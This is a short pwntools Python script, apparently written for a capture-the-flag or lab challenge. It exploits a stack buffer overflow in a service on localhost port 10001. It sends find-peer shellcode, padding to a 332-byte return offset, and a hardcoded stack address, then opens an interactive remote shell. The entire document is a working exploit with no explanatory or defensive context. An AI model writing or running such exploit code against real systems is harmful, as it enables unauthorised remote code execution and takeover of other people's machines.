#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")

BUFFER_ADDRESS = 0xffeadc90
RET_OFFSET = 332
SHELLCODE = asm(shellcraft.findpeersh())

r = remote('localhost', 10001)
r.send(flat(-1, SHELLCODE, 'A' * (RET_OFFSET - len(SHELLCODE)), BUFFER_ADDRESS))
r.interactive()
